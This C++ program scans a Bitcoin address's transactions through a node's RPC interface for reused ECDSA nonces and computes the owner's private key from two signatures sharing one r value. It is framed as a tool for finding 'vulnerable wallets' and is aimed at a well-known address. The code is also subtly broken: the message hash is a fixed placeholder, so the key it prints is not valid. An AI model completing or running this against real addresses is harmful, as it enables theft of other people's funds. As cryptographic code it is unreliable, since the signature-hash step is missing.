#include <iostream>
#include <vector>
#include <map>
#include <string>
#include <sstream>
#include <iomanip>
#include <curl/curl.h>
#include <nlohmann/json.hpp>
#include <openssl/bn.h>
#include <openssl/err.h>

using json = nlohmann::json;

// secp256k1 order n
const char* N_HEX = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141";

// RPC configuration (adjust with your credentials)
std::string rpc_user = "seu_usuario";
std::string rpc_password = "sua_senha";
std::string rpc_host = "localhost";
std::string rpc_port = "8332";
std::string rpc_url = "http://" + rpc_user + ":" + rpc_password + "@" + rpc_host + ":" + rpc_port;

// Callback for curl write
static size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

// Function to convert hex string to bytes
std::vector<unsigned char> hex_to_bytes(const std::string& hex) {
    std::vector<unsigned char> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        unsigned char byte = static_cast<unsigned char>(std::stoul(hex.substr(i, 2), nullptr, 16));
        bytes.push_back(byte);
    }
    return bytes;
}

// Function to perform JSON-RPC call
json rpc_call(const std::string& method, const json& params) {
    CURL* curl = curl_easy_init();
    std::string data;
    json request = {{"jsonrpc", "1.0"}, {"id", "curltest"}, {"method", method}, {"params", params}};
    std::string postdata = request.dump();

    struct curl_slist* headers = nullptr;
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl_easy_setopt(curl, CURLOPT_URL, rpc_url.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postdata.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &data);

    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);

    if (res != CURLE_OK) {
        throw std::runtime_error("RPC call failed");
    }

    json response = json::parse(data);
    if (response.contains("error") && !response["error"].is_null()) {
        throw std::runtime_error(response["error"].dump());
    }
    return response["result"];
}

// Function to get transaction data via RPC
json get_transaction_data(const std::string& txid) {
    try {
        return rpc_call("getrawtransaction", {txid, true});
    } catch (const std::exception& e) {
        std::cerr << "Error getting transaction " << txid << ": " << e.what() << std::endl;
        return nullptr;
    }
}

// Function to extract r, s, and message hash from a Bitcoin transaction
// Assumes P2PKH input scripts
void extract_signature_data(const json& tx, BIGNUM*& r, BIGNUM*& s, BIGNUM*& h) {
    auto vin = tx["vin"];
    for (const auto& input : vin) {
        std::string script_sig_hex = input["scriptSig"]["hex"];

        // Convert hex to bytes
        auto bytes = hex_to_bytes(script_sig_hex);

        size_t pos = 0;
        unsigned char sig_len = bytes[pos++];
        std::vector<unsigned char> sig_bytes(bytes.begin() + pos, bytes.begin() + pos + sig_len);
        pos += sig_len;

        // Parse DER signature
        size_t sig_pos = 0;
        if (sig_bytes[sig_pos++] != 0x30) continue;  // Sequence
        sig_bytes[sig_pos++];  // Total length (ignore)
        if (sig_bytes[sig_pos++] != 0x02) continue;  // Integer for r
        unsigned char r_len = sig_bytes[sig_pos++];
        std::vector<unsigned char> r_bytes(sig_bytes.begin() + sig_pos, sig_bytes.begin() + sig_pos + r_len);
        sig_pos += r_len;
        if (sig_bytes[sig_pos++] != 0x02) continue;  // Integer for s
        unsigned char s_len = sig_bytes[sig_pos++];
        std::vector<unsigned char> s_bytes(sig_bytes.begin() + sig_pos, sig_bytes.begin() + sig_pos + s_len);

        // Skip leading zero if present (for positive bigints)
        if (r_bytes[0] == 0) r_bytes.erase(r_bytes.begin());
        if (s_bytes[0] == 0) s_bytes.erase(s_bytes.begin());

        // Convert to BIGNUM
        r = BN_bin2bn(r_bytes.data(), r_bytes.size(), nullptr);
        s = BN_bin2bn(s_bytes.data(), s_bytes.size(), nullptr);

        // Placeholder for h (message hash); in real use, compute sighash here
        h = BN_new();
        BN_set_word(h, 0x123);  // Replace with actual sighash calculation

        return;  // Use first valid signature
    }
    r = nullptr;
    s = nullptr;
    h = nullptr;
}

// Function to find vulnerable wallets by checking for r reuse
std::pair<std::tuple<BIGNUM*, BIGNUM*, BIGNUM*>, std::tuple<BIGNUM*, BIGNUM*, BIGNUM*>> find_vulnerable_wallets(const std::string& address) {
    try {
        json txids = rpc_call("getaddresstxids", {json::object({{"addresses", json::array({address})}})});
        std::map<std::string, int> r_values;  // Map r (as hex) to index
        std::vector<std::tuple<BIGNUM*, BIGNUM*, BIGNUM*>> signatures;

        for (const auto& txid : txids) {
            json tx = get_transaction_data(txid.get<std::string>());
            if (!tx.is_null()) {
                BIGNUM *r = nullptr, *s = nullptr, *h = nullptr;
                extract_signature_data(tx, r, s, h);
                if (r && s && h) {
                    char* r_hex = BN_bn2hex(r);
                    std::string r_str(r_hex);
                    OPENSSL_free(r_hex);

                    signatures.emplace_back(r, s, h);

                    auto it = r_values.find(r_str);
                    if (it != r_values.end()) {
                        // Found nonce reuse
                        return {signatures[it->second], signatures.back()};
                    }
                    r_values[r_str] = signatures.size() - 1;
                }
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "Error fetching transactions for address " << address << ": " << e.what() << std::endl;
    }
    return {{nullptr, nullptr, nullptr}, {nullptr, nullptr, nullptr}};
}

// Function to recover private key using ECDSA double k formula
BIGNUM* recover_private_key(BIGNUM* r, BIGNUM* s1, BIGNUM* s2, BIGNUM* h1, BIGNUM* h2) {
    BN_CTX* ctx = BN_CTX_new();
    BIGNUM* n_bn = BN_new();
    BN_hex2bn(&n_bn, N_HEX);

    BIGNUM* numerator = BN_new();
    BN_mul(numerator, s2, h1, ctx);
    BIGNUM* temp = BN_new();
    BN_mul(temp, s1, h2, ctx);
    BN_sub(numerator, numerator, temp);
    BN_mod(numerator, numerator, n_bn, ctx);

    BIGNUM* denominator = BN_new();
    BN_sub(denominator, s1, s2);
    BN_mul(denominator, r, denominator, ctx);
    BN_mod(denominator, denominator, n_bn, ctx);

    BIGNUM* denominator_inv = BN_new();
    BN_mod_inverse(denominator_inv, denominator, n_bn, ctx);

    BIGNUM* sk = BN_new();
    BN_mod_mul(sk, numerator, denominator_inv, n_bn, ctx);

    // Cleanup
    BN_free(numerator);
    BN_free(temp);
    BN_free(denominator);
    BN_free(denominator_inv);
    BN_free(n_bn);
    BN_CTX_free(ctx);

    return sk;
}

int main() {
    // Example address (replace with a vulnerable P2PKH one for testing)
    std::string address = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa";  // Satoshi's address (example)

    std::cout << "Analyzing address: " << address << std::endl;

    auto [sig1, sig2] = find_vulnerable_wallets(address);

    if (std::get<0>(sig1) && std::get<0>(sig2)) {
        BIGNUM *r1 = std::get<0>(sig1), *s1 = std::get<1>(sig1), *h1 = std::get<2>(sig1);
        BIGNUM *r2 = std::get<0>(sig2), *s2 = std::get<1>(sig2), *h2 = std::get<2>(sig2);

        char* r1_hex = BN_bn2hex(r1);
        char* r2_hex = BN_bn2hex(r2);
        if (std::string(r1_hex) == std::string(r2_hex)) {  // Confirm nonce reuse
            std::cout << "Nonce reuse detected! r: 0x" << r1_hex << std::endl;
            BIGNUM* sk = recover_private_key(r1, s1, s2, h1, h2);
            if (sk) {
                char* sk_hex = BN_bn2hex(sk);
                std::cout << "Recovered private key: 0x" << sk_hex << std::endl;
                OPENSSL_free(sk_hex);
                BN_free(sk);
            } else {
                std::cout << "Failed to recover private key." << std::endl;
            }
        } else {
            std::cout << "No nonce reuse found." << std::endl;
        }
        OPENSSL_free(r1_hex);
        OPENSSL_free(r2_hex);

        // Free BIGNUMs
        BN_free(r1); BN_free(s1); BN_free(h1);
        BN_free(r2); BN_free(s2); BN_free(h2);
    } else {
        std::cout << "No vulnerability detected for address " << address << "." << std::endl;
    }

    return 0;
}
